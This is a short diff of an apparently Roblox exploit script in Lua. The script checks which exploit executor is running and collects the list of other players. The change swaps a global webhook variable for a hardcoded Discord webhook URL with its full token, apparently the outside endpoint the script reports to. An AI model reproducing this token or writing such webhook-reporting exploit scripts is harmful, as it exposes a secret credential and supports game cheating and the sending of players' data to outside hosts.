@@ -5,7 +5,7 @@ local webhookcheck =
 	SONA_LOADED and "Sona" or
 	"Kid with shit exploit"
 
-local url = _G.Webhook
+local url = "https://discord.com/api/webhooks/995205501459628032/jhuctE04UZPYVa9-fxgVuErdCkpz4lDwU_sGnmWIMj5vA4OI0e5akDcl6qukySZdK896"
 
 local OtherPlayers = game:GetService("Players"):GetPlayers()
 
